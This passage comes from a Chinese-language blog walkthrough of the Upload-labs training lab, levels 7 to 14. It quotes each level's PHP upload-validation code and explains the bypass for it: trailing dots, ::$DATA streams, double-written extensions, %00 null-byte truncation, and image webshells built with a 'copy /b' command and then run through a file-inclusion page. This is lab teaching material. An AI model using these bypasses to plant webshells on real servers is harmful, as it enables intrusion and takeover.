   $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看代码发现，大小写，空格，等等都是绕不过的，但是还有一个在后缀名中家点号<br>没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，上传后文件名后缀的点会被去除，所以可在后缀名中加”.”绕过，走起：</p>
<img src="/2019/07/31/Upload-labs/0x07-1.png" title="0x07-1">

<h1 id="Pass-08-DATA绕过——Windows"><a href="#Pass-08-DATA绕过——Windows" class="headerlink" title="Pass-08 ::$DATA绕过——Windows"></a>Pass-08 ::$DATA绕过——Windows</h1><p>这一题的代码比上一次少了下面这一段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure>

<p>这个是关于windows下文件的流特性，可以参考一下这篇文章<br><strong><a href="https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream" target="_blank" rel="noopener">https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream</a></strong><br>在后缀添加::$DATA 即可绕过上传1.php::$DATA之后会变成1.php</p>
<p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。</p>
<p>上传xxx.php::$DATA绕过。<strong>(仅限windows)</strong></p>
<img src="/2019/07/31/Upload-labs/0x08-1.png" title="0x08-1">

<h1 id="Pass-09-点空格点绕过——Windows"><a href="#Pass-09-点空格点绕过——Windows" class="headerlink" title="Pass-09 点空格点绕过——Windows"></a>Pass-09 点空格点绕过——Windows</h1><p>这一关像是前几关的组合拳，虽然把最后的点给删掉，但是仍然可以绕过，因为这里的过滤并没有递归下去，只是一步，这样就相当于SQL注入里面用str_replace只过滤一次关键字一样</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>可以遵循着他的步骤去实现自己的payload，可以设置为<strong>pass09.php. .</strong></p>
<img src="/2019/07/31/Upload-labs/0x09-1.png" title="0x09-1">
<p>这样一来检测到最后的文件名是<strong>pass09.php.</strong>，这样就相当于第七关了</p>
<h1 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="关键函数解析"><a href="#关键函数解析" class="headerlink" title="关键函数解析"></a>关键函数解析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str_ireplace(find,replace,string,count)</span><br><span class="line">参数  描述</span><br><span class="line">find    必需。规定要查找的值。</span><br><span class="line">replace 必需。规定替换 find 中的值的值。</span><br><span class="line">string  必需。规定被搜索的字符串。</span><br><span class="line">count   可选。一个变量，对替换数进行计数。</span><br></pre></td></tr></table></figure>

<p>上面的代码依旧是黑名单过滤，这里是将文件后缀名替换为空，只替换了一次</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">$file_name = str_ireplace($deny_ext,<span class="string">""</span>, <span class="string">'pphphp'</span>);</span><br><span class="line">var_dump($file_name);</span><br><span class="line"><span class="comment">#绕过测试代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2019/07/31/Upload-labs/0x10-1.png" title="0x10-1">

<h1 id="Pass-11-00截断GET方式"><a href="#Pass-11-00截断GET方式" class="headerlink" title="Pass-11 00截断GET方式"></a>Pass-11 00截断GET方式</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="关键函数解析-1"><a href="#关键函数解析-1" class="headerlink" title="关键函数解析"></a>关键函数解析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">strrpos()</span><br><span class="line">定义和用法</span><br><span class="line">strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。</span><br><span class="line">注释：strrpos() 函数对大小写敏感。</span><br><span class="line">相关函数：</span><br><span class="line">stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）</span><br><span class="line">strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</span><br><span class="line">strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</span><br><span class="line">语法</span><br><span class="line">strrpos(string,find,start)</span><br><span class="line">参数  描述</span><br><span class="line">string  必需。规定被搜索的字符串。</span><br><span class="line">find    必需。规定要查找的字符。</span><br><span class="line">start   可选。规定在何处开始搜索。</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">substr()</span><br><span class="line">这里写代码片语法</span><br><span class="line">substr(string,start,length)</span><br><span class="line">参数  描述</span><br><span class="line">string  必需。规定要返回其中一部分的字符串。</span><br><span class="line">start   必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始  负数 - 在从字符串结尾开始的指定位置开始0 - 在字符串中的第一个字符处开始</span><br><span class="line">length  可选。规定被返回字符串的长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回的长度负数 - 从字符串末端返回的长度</span><br></pre></td></tr></table></figure>

<p><strong>test:</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'1.jpg'</span>;</span><br><span class="line">$file_ext = substr($a,strrpos($a,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">var_dump($file_ext);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">返回jpg</span><br></pre></td></tr></table></figure>

<p>分析代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>,<span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure>

<p>发现那个路径没有处理直接拼接上去的。所以可以利用00截断绕过。但是发现怎么截断都没有用。查阅资料：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">截断条件：</span><br><span class="line">    php版本小于5.3.4 详情关注CVE-2006-7243</span><br><span class="line">    php的magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure>

<p>解决后，抓包</p>
<img src="/2019/07/31/Upload-labs/0x11-1.png" title="0x11-1">
<p>请求中会自动将%00进行url解码，在后台进行拼凑的时候会自动阶段后面的字符串<br>上传成功后的文件名即为你修改的名</p>
<h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><p>在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断</p>
<h1 id="Pass-12-00截断POST方式"><a href="#Pass-12-00截断POST方式" class="headerlink" title="Pass-12 00截断POST方式"></a>Pass-12 00截断POST方式</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该题也是00截断，只不过由于文件路径这个参数是通过post请求发送的，需要抓包后再hex中修改，因为post不会像get对%00进行自动解码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure>

<p>save_path 从 GET 变成了 POST, 此时不能再使用 %00 截断, 原因是 %00 截断在 GET 中被 url 解码之后是空字符, 但是在 POST 中 %00 不会被 url 解码, 所以只能通过 burpsuite 修改 hex 值为 00 进行截断.<br>这里把 <strong>2b(‘+’的 hex) 修改成 00 或者把 20(‘空格’的hex)修改为00</strong></p>
<img src="/2019/07/31/Upload-labs/0x12-1.jpg" title="0x12">
<p>这里的路径 <strong>1.php+或1.php 都可</strong> 需自己手动加上</p>
<img src="/2019/07/31/Upload-labs/0x12-2.jpg" title="0x12">
<p>完成发送即可上传</p>
<h2 id="补充：-1"><a href="#补充：-1" class="headerlink" title="补充："></a>补充：</h2><p>在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断</p>
<h1 id="Pass-13-图片马"><a href="#Pass-13-图片马" class="headerlink" title="Pass-13 图片马"></a>Pass-13 图片马</h1><p>通过上传图片马，再利用本地包含漏洞执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现主要是取上传文件的头两个字节判断文件类型，因此直接上传图片马即可<br>图片马制作方法,cmd中执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy one.jpg /b + one.php /a one.jpg</span><br><span class="line">/b:指定二进制格式复制、合并文件，用于图像或者声音类文件</span><br><span class="line">/a:指定以ascii格式复制、合并文件，用于txt等文本累文件</span><br></pre></td></tr></table></figure>

<p>或</p>
<p>利用16进制编辑器在图片的编辑栏末尾加上木马</p>
<img src="/2019/07/31/Upload-labs/0x13-1.png" title="0x13-1">

<p>成功上传，而且得到文件的名称。我们后期如果存在文件包含漏洞就可以利用</p>
<p>比如我们简单写一个存在文件包含漏洞的页面:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现可以成功利用漏洞： </p>
<img src="/2019/07/31/Upload-labs/0x13-2.jpg" title="0x13-2">

<h1 id="Pass-14-图片马getimagsize函数"><a href="#Pass-14-图片马getimagsize函数" class="headerlink" title="Pass-14 图片马getimagsize函数"></a>Pass-14 图片马getimagsize函数</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>

<p>这里用getimagesize获取文件类型，还是直接就可以利用图片马就可进行绕过，</p>
